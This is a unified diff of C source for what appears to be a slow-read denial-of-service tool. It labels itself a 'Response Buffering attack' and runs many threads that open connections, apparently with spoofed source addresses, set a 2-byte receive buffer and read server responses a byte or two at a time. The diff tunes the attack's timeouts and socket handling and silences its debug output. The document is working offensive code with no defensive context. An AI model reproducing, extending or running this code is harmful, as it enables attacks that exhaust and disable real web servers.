@@ -52,18 +52,17 @@ void *generate_response_buffering(void *data)
 		// get now resource
 		get_masking_arguments(&g_resbuf_input, &g_resbuf_now);
 		if (response_buffering_cnt % RESPONSE_BUFFERING_CNT == 0) {
-			/*
-			 if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
-			 perror("sock creation failed\n");
-			 }
-			 if (connect(sock, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0) {
-			 perror("connect failed\n");
-			 }*/
+			if(sock!=-1)
+				close(sock);
+
 			int rvsz = 2;
-			setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rvsz,
-					sizeof(rvsz));
+
 			rvsz = 1;
 			setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (const char*)&rvsz, sizeof(rvsz));
+
+			rvsz = 2;
+			setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rvsz,
+								sizeof(rvsz));
 
 			sock = tcp_make_connection(
 					inet_addr(g_resbuf_now.src),
@@ -72,7 +71,7 @@ void *generate_response_buffering(void *data)
 					g_resbuf_now.port,
 					&seq,
 					&ack,
-					5000);
+					1);
 
 			char http_request[] = GET_METHOD;
 			/*if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
@@ -88,7 +87,7 @@ void *generate_response_buffering(void *data)
 					strlen(GET_METHOD),
 					seq,
 					ack,
-					2);
+					1);
 			response_buffering_cnt = 0;
 
 			fcntl(sock, F_SETFL, O_NONBLOCK);
@@ -103,26 +102,26 @@ void *generate_response_buffering(void *data)
 				&g_resbuf_before_time,
 				&g_resbuf_now_time,
 				&g_resbuf_num_generated_in_sec);
-		// read a character
+		//read a character
 		char buffer[2];
 		int recv_size = -1;
 		int sockaddrlen = sizeof(struct sockaddr_in);
-		recv_size = recvfrom(sock, buffer, 1, 0, NULL, &sockaddrlen);
+		recv_size = recv(sock, buffer, 2, 0);
 		if (recv_size == -1) {
-			printf("no recv!\n");
+			//printf("null recvd\n");
 		}
 		/*tcp_socket_send_ack(sock, inet_addr(g_resbuf_now.src),
 				inet_addr(g_resbuf_now.dest), src_port,
 				g_resbuf_now.port, seq, ack);*/
 		ack++;
-		printf("Read : %c\n", buffer[0]);
+		//printf("Read : %c\n", buffer[0]);
 		g_resbuf_num_generated_in_sec++;
 		g_resbuf_num_total++;
 		response_buffering_cnt++;
 		// *** end of critical section ***
 		pthread_mutex_unlock(&g_resbuf_mutex);
 	}
-	close(sock);
+
 	return NULL;
 }
 
@@ -164,7 +163,7 @@ void response_buffering_main(char *argv[])
 	for (int i = 0; i < num_threads; i++) {
 		thread_ids[i] = i;
 	}
-	printf("Body Buffering attack to %s using %d threads\n", g_resbuf_input.dest,
+	printf("Response Buffering attack to %s using %d threads\n", g_resbuf_input.dest,
 			num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
